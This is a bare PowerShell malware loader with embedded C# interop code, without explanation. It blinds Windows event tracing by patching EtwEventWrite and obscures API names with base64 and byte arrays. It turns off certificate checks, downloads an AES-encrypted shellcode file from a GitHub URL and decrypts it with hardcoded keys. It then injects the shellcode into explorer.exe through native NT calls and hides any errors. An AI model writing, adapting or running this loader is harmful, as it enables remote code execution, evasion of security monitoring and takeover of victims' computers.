
try {
    $url = "https://github.com/lucid251/22RAdTOJFD/raw/refs/heads/main/vi2_x64_enc.bin"
    $targetProcess = "explorer"

    $PInvoke = @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class Win32 {
    [StructLayout(LayoutKind.Sequential)]
    public struct OBJECT_ATTRIBUTES { public int Length; public IntPtr RootDirectory; public IntPtr ObjectName; public uint Attributes; public IntPtr SecurityDescriptor; public IntPtr SecurityQualityOfService; }
    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID { public IntPtr UniqueProcess; public IntPtr UniqueThread; }

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtOpenProcess(ref IntPtr ProcessHandle, uint DesiredAccess, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint NumberOfBytesToWrite, ref uint NumberOfBytesWritten);
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtCreateThreadEx(out IntPtr threadHandle, uint DesiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, uint stackZeroBits, uint sizeOfStackCommit, uint sizeOfStackReserve, IntPtr bytesBuffer);

    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    public static object GetDelegate(Type type) {
        byte[] ntdllBytes = { 110, 116, 100, 108, 108, 46, 100, 108, 108 };
        string ntdll = Encoding.ASCII.GetString(ntdllBytes);
        IntPtr hModule = LoadLibrary(ntdll);
        IntPtr procAddress = GetProcAddress(hModule, type.Name);
        return Marshal.GetDelegateForFunctionPointer(procAddress, type);
    }
}
"@
    Add-Type $PInvoke -ErrorAction SilentlyContinue
    $etw_lib = [Win32]::LoadLibrary(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("bnRkbGwuZGxs"))))
    $etw_addr = [Win32]::GetProcAddress($etw_lib, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXR3RXZlbnRXcml0ZQ=="))))
    if ($etw_addr -ne [IntPtr]::Zero) {
        $etw_patch = [byte[]](0xC3)
        $etw_oldProt = 0
        [Win32]::VirtualProtect($etw_addr, [UIntPtr]$etw_patch.Length, 0x40, [ref]$etw_oldProt)
        [System.Runtime.InteropServices.Marshal]::Copy($etw_patch, 0, $etw_addr, $etw_patch.Length)
        [Win32]::VirtualProtect($etw_addr, [UIntPtr]$etw_patch.Length, $etw_oldProt, [ref]$etw_oldProt)
    }

    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
    $encryptedData = (New-Object System.Net.WebClient).DownloadData($url)
    $key = [System.Text.Encoding]::UTF8.GetBytes("G1ubaHqqa1gMJXRNHCKIVQDT")
    $iv = [System.Text.Encoding]::UTF8.GetBytes("22RAdT$]rTwYuLO[")

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.Key = $key
    $aes.IV = $iv
    $decryptor = $aes.CreateDecryptor()
    $shellcode = $decryptor.TransformFinalBlock($encryptedData, 0, $encryptedData.Length)

    $pid = (Get-Process $targetProcess)[0].Id
    $hProcess = [IntPtr]::Zero
    $objAttr = New-Object Win32.OBJECT_ATTRIBUTES
    $clientId = New-Object Win32.CLIENT_ID
    $clientId.UniqueProcess = [IntPtr]$pid

    $NtOpenProcess = [Win32]::GetDelegate([Win32.NtOpenProcess])
    $NtOpenProcess.Invoke([ref]$hProcess, 0x1F0FFF, [ref]$objAttr, [ref]$clientId)

    $baseAddress = [IntPtr]::Zero
    $regionSize = [IntPtr]$shellcode.Length
    $NtAllocateVirtualMemory = [Win32]::GetDelegate([Win32.NtAllocateVirtualMemory])
    $NtAllocateVirtualMemory.Invoke($hProcess, [ref]$baseAddress, [IntPtr]::Zero, [ref]$regionSize, 0x3000, 0x40)

    $bytesWritten = 0
    $buffer = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($shellcode.Length)
    [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $buffer, $shellcode.Length)
    $NtWriteVirtualMemory = [Win32]::GetDelegate([Win32.NtWriteVirtualMemory])
    $NtWriteVirtualMemory.Invoke($hProcess, $baseAddress, $buffer, $shellcode.Length, [ref]$bytesWritten)

    $hThread = [IntPtr]::Zero
    $NtCreateThreadEx = [Win32]::GetDelegate([Win32.NtCreateThreadEx])
    $NtCreateThreadEx.Invoke([ref]$hThread, 0x1F0FFF, [IntPtr]::Zero, $hProcess, $baseAddress, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)

} catch {}
